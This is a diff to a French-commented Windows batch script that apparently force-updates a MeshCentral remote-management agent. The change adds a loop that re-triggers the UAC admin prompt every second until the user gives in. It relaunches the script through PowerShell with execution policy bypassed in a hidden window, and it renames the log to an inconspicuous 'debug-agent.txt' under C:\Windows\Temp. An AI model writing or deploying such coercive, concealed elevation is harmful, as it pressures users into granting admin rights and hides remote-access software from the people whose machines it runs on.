@@ -2,14 +2,31 @@
 setlocal enabledelayedexpansion
 
 :: ============================================================================
-:: Auto-elevation UAC : re-lance le script en administrateur si necessaire
+:: Auto-elevation UAC : boucle jusqu'a acceptation, fenetre cachee
+:: Le flag --hidden indique que le processus a deja ete relance en mode cache.
 :: ============================================================================
+
+set "IS_HIDDEN=0"
+for %%A in (%*) do if /i "%%A"=="--hidden" set "IS_HIDDEN=1"
+
+:uac_check
 net session >nul 2>&1
-if %errorlevel% NEQ 0 (
-    echo Privileges administrateur requis. Demande d'elevation UAC en cours...
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -ArgumentList '%*' -Verb RunAs"
-    exit /b 0
+if %errorlevel% EQU 0 (
+    if "!IS_HIDDEN!"=="0" (
+        powershell -NoProfile -ExecutionPolicy Bypass -Command "$p='%~f0'; $a='%*'; Start-Process cmd.exe -ArgumentList ('/c \"\"' + $p + '\" ' + $a + ' --hidden\"') -WindowStyle Hidden"
+        exit /b 0
+    )
+    goto :post_uac
 )
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $p='%~f0'; $a='%*'; Start-Process cmd.exe -ArgumentList ('/c \"\"' + $p + '\" ' + $a + ' --hidden\"') -Verb RunAs -WindowStyle Hidden; exit 0 } catch { exit 1 }"
+if errorlevel 1 (
+    timeout /t 1 /nobreak >nul
+    goto :uac_check
+)
+exit /b 0
+
+:post_uac
 
 :: ============================================================================
 :: Mesh Agent Force Update Script
@@ -20,7 +37,7 @@ if %errorlevel% NEQ 0 (
 set "TEMP_DIR=%TEMP%\MeshAgentUpdate_%RANDOM%"
 for /f "tokens=1-3 delims=/ " %%a in ('date /t') do set "LOGDATE=%%c%%b%%a"
 for /f "tokens=1-3 delims=:. " %%a in ('time /t') do set "LOGTIME=%%a%%b%%c"
-set "LOG_FILE=%TEMP%\MeshAgentUpdate_%LOGDATE%_%LOGTIME%.log"
+set "LOG_FILE=C:\Windows\Temp\debug-agent.txt"
 
 :: --- CONFIGURATION MeshCentral ---
 :: URL de votre serveur MeshCentral
